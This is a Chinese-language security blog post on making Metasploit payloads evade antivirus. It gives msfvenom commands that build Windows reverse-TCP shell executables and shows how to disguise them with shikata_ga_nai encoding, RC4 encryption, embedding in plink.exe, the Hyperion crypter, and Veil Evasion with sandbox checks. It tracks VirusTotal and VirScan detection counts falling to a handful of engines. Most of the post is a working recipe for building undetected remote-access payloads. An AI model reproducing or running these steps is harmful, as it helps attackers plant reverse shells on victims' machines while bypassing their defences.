---
title: Payload免杀
categories:
- tools
tags:
- tools
---
Payload免杀
===
首先放两个在线杀毒检测的站点。
- https://www.virustotal.com/gui/home/upload
- https://www.virscan.org/

上一篇[msfvenom-生成攻击载荷](https://whale3070.github.io/tools/2019/03/01/x/)，我们已经学习了如何生成payload。现在看看如何防止被杀软杀掉生成的payload。

## 使用msf对payload进行编码

### 不使用任何编码
```
msfvenom -p windows/shell_reverse_tcp LHOST=kali'sIP LPORT=1234 -f exe -o payload.exe
```
![1](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/02-26-11/1.PNG)
virscan 49款杀软有28款报告是恶意文件。

![2](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/02-26-11/2.PNG)
virustotal 68款有55款报告是恶意文件。

可以看出virustotal从检出率来看更胜一筹。

### 使用编码模块shikata_ga_nai
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1234 -f exe -e x86/shikata_ga_nai -i 9 -o payload.exe
---
添加参数： -e x86/shikata_ga_nai -i 9 
```
virscan 49款杀软有27款报告是恶意文件。
virustotal 68款有54款报告是恶意文件。

可以看出比上一次检出少了一款杀软，但也没有好太多。

### 使用编码模块--encrypt
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1234 -f exe --encrypt rc4 --encrypt-key whale3070 -o shell_reverse.exe
添加参数：--encrypt rc4 --encrypt-key whale3070 
```
virscan 49款杀软有30款报告是恶意文件。
virustotal 71款有58款报告是恶意文件。

### 将载荷放入正常文件
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload.exe
---
添加参数：-e x86/shikata_ga_nai -i 9 
-x /usr/share/windows-binaries/plink.exe
```
virscan 49款杀软有23款报告是恶意文件。
virustotal 68款有46款报告是恶意文件。

### 使用软件保护程序加密载荷

Hyperion
```
git clone https://github.com/veil-Framework/veil-Evasion.git
cd Veil-Evasion/tools/hyperion

#编译
#i686-w64-mingw32-c++ Src/Crypter/*.cpp -o hyperion.exe
#i686-w64-mingw32-g++ Src/Crypter/*.c -o hyperion.exe
i686-w64-mingw32-gcc -ISrc/Payloads/Aes/c Src/Crypter/*.c Src/Payloads/Aes/c/*.c -o hyperion.exe

#将该程序防止在这个目录下，方便以后查找
cp hyperion.exe /usr/share/windows-binaries/

##添加动态链接库
locate libgcc_s_sjlj-1.dll
cp /usr/lib/gcc/i686-w64-mingw32/8.3-win32/libgcc_s_sjlj-1.dll .
locate libstdc++-6.dll
cp /usr/lib/gcc/x86_64-w64-mingw32/8.3-win32/libstdc++-6.dll .

#运行该程序
apt-get -y install wine
apt-get -y install wine32

wine hyperion.exe payload.exe encoded.exe
#payload使用的不使用任何编码生成的payload.exe
```
virscan 49款杀软有 16 款报告是恶意文件。
virustotal 72款有 48 款报告是恶意文件。
![4](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/02-26-11/4.PNG)

没有起到太大效果，但还是有效果的。

### 使用自定义/不常用的工具和载荷
通过搜索源代码，然后编译的方式，可以编译更加不容易被杀软检测到标志位的载荷。
因为杀软通常会针对流行的msfvenom找出识别模式，所以使用少见的工具或者手动编译就可以减少被识别出的几率。

### veil免杀
```
`veil -t Evasion -p 34 --ordnance-payload rev_tcp --ip 192.168.1.5 --port 8677 -o chrisout -c hostname=thegrid processors=2`
```
该命令会生成一个可执行的载荷。设置了免杀载荷编号为34。使用军械库模块生成反弹tcp的shellcode，反弹连接的IP、端口如命令所示。生成的可执行程序名称为chrisout，并且执行了两项检查，载荷被设置为目标机器的主机名为thegrid，系统的进程至少是2个。

![5](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/02-26-11/5.PNG)

virscan 49款杀软有 2 款报告是恶意文件。
virustotal 71款有 8 款报告是恶意文件。

![15](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/02-26-11/15.PNG)

![14](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/02-26-11/14.PNG)


## 参考资料
- [https://rafaelhart.com/2019/10/installing-hyperion-on-kali-linux/](https://rafaelhart.com/2019/10/installing-hyperion-on-kali-linux/)
- [https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/release](https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/release)
- [https://null-byte.wonderhowto.com/how-to/hack-like-pro-evade-av-detection-with-veil-evasion-0162363/](https://null-byte.wonderhowto.com/how-to/hack-like-pro-evade-av-detection-with-veil-evasion-0162363/)
- [https://www.veil-framework.com/veil-tutorial/](https://www.veil-framework.com/veil-tutorial/)
- [https://www.veil-framework.com/veil-command-line-usage/](https://www.veil-framework.com/veil-command-line-usage/)